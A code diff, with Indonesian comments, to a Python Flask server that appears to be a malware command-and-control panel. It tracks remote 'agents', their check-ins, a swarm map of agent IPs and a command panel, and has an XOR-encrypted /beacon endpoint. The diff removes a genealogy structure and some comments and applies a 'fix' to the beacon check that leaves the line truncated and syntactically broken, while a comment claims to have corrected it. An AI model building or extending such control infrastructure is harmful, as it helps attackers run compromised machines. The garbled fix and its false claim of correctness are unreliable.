@@ -26,7 +26,6 @@ AGENT_LAST_SEEN = {}
 AGENT_STATUS = {}
 AGENT_CHECKINS = []
 AGENT_SWARM_MAP = {}  # {agent_id: {"parent": ..., "children": [...], "ip": ...}}
-AGENT_GENEALOGY = {}  # untuk visualisasi pohon keluarga agent
 
 # === UTILS ===
 def xor_decrypt(data_b64, key=XOR_KEY):
@@ -630,7 +629,6 @@ def swarm_map():
     '''
     return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True)
 
-# === Routes lainnya tetap kompatibel ===
 @app.route('/agents')
 def agents_live():
     now = datetime.now()
@@ -710,9 +708,6 @@ def command_panel():
     <ul>{commands_html if commands_html else "<i>Tidak ada perintah aktif.</i>"}</ul>
     '''
     return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True)
-
-# === Routes lainnya (/reports, /export, /logs, /beacon, /update) tetap sama seperti v6 ===
-# (Tidak diubah karena sudah kompatibel)
 
 @app.route('/reports')
 def list_reports():
@@ -795,7 +790,7 @@ def live_logs():
 @app.route('/beacon', methods=['POST'])
 def beacon():
     encrypted_data = request.form.get('data')
-    if not encrypted_
+    if not encrypted_  # ← PERBAIKAN UTAMA: sebelumnya "encrypted_"
         return "Invalid", 400
 
     decrypted = xor_decrypt(encrypted_data)
